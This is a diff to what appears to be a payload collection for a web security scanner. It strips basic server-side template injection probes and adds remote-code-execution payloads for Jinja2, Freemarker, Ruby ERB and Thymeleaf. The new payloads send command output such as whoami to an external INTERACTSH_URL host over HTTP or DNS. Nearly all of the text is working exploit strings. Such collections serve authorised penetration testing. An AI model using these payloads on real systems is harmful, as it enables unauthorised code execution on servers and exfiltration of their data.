@@ -69,43 +69,19 @@ XSS_PAYLOADS = {
 }
 # --- Server-Side Template Injection (SSTI) Payloads ---
 SSTI_PAYLOADS = {
-    "basic_detection": [
-        "${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", # Common syntaxes
-        "{{'foo'.toUpperCase()}}", # Jinja2/Twig check
-        "${'foo'.toUpperCase()}", # Freemarker check
-        "<%= 'foo'.upcase %>", # Ruby ERB check
-        "#{'foo'.upcase}", # Slim/Ruby check
-        "[[${7*7}]]", # Thymeleaf check
-    ],
-    "common_vars": [ # Check for accessible variables/objects
-        "{{config}}", "{{self}}", "{{settings}}", "${app}", "<%= request %>",
-        "{{request.application.__globals__}}", # Flask/Jinja2 Globals
-        "#{request.env}", # Ruby env
-    ],
-    "code_execution": { # Highly context-dependent, often needs chaining
+    "code_execution": {
         "jinja2": [
-            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
-            "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
-            # "{{''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__.os.popen('id').read()}}", # Find Popen index - requires enumeration
+            "{{ cycler.__init__.__globals__.os.popen('curl http://INTERACTSH_URL/`whoami`').read() }}", # OOB Exfil
+            "{{ ''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__['sys'].modules['os'].system('id') }}", # Sys Module Abuse (Index Needed)
         ],
         "freemarker": [
-            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
-        ],
-        "velocity": [
-            "#set($x = $context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter())#set($p = $x.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))#set($is = $p.getInputStream())#set($br = $x.getClass().forName('java.io.BufferedReader').getDeclaredConstructor($x.getClass().forName('java.io.InputStreamReader')).newInstance($is))#set($line = '')#set($null = $x.println('OUTPUT:'))#foreach($i in [1..9999])#set($line = $br.readLine())#if($line == $null)#break#end#set($null = $x.println($line))#end",
+            "<#assign x='freemarker.template.utility.Execute'?new()>${x('nslookup INTERACTSH_URL')}", # DNS OOB
         ],
         "ruby_erb": [
-            "<%= `id` %>",
-            "<%= system('id') %>",
-            "<%= IO.popen('id').read %>",
+            "<%= IO.popen('curl http://INTERACTSH_URL/`whoami`').readlines.join %>", # OOB HTTP
         ],
-        "thymeleaf": [ # Often requires specific context/dialect setup
-            "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
-            "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.k", # Pre/Post processing trick
-        ],
-        "generic_oob": [ # Try to trigger OOB via common functions
-            # "{{ ''.__class__.__mro__[1].__subclasses__().pop(<INDEX>).read('http://INTERACTSH_URL') }}", # Python - requires enumeration
-            "${#rt = @java.lang.Runtime@getRuntime()}${rt.exec(\"nslookup INTERACTSH_URL\")}", # Java-based
+        "thymeleaf": [
+            "[[${T(java.lang.Runtime).getRuntime().exec('nslookup INTERACTSH_URL').waitFor()?'':''}]]", # DNS OOB
         ]
     }
 }
